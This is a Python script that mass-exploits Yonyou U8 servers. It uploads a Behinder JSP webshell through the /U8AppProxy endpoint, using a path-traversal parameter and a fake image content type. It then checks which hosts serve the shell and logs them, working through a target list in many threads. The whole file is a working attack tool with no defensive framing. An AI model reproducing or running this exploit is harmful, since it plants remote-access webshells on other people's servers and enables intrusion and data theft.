import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
line_break = '\n'
file_path = Path(__file__).resolve().parent
result_path = file_path/'result.txt'


def exploit(ip_, index):
    try:

        url = ip_+'/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../yongyouU8_mike'

        # print(url)
        # Set up the file contents
        with open(r'D:\youxi\0x7eTools\Tools\WebShell\webshell_Manage\Behinder\Behinder_v4.0.6\server\shell.jsp', 'r', encoding='utf8') as f:
            file_contents = f.read()
        # print(file_content)

        # file_contents = '<% out.println("yongyongU8");%>'
        files = {
            'file': ('1.jsp', file_contents, 'image/png'),
        }
        res = requests.post(url, headers=headers,
                            files=files, timeout=8, verify=False)
        print(res, len(res.text))
        print(ip_)
        get_ip = ip_+'/yongyouU8_mike.jsp'
        get_res = requests.get(get_ip, headers=headers,
                               timeout=8, verify=False)
        print('get_res: ', get_res)
        if get_res.status_code != 200:
            return
        print(get_ip)
        with open(file_path/'result_exp.txt', 'a+') as file:
            file.write(get_ip+line_break)
        # with result_path.open('a+') as file:
            # file.write(get_ip+line_break)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url)


threads = []
# with open(r'D:\Downloads\tmp\GRP-U8.txt', 'r') as file:
with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 160
        end = start+10

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break).split('/yongyouU8')[0]
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 30
# print(urls)

test = 't'


if test == 't':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test == 'm':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()
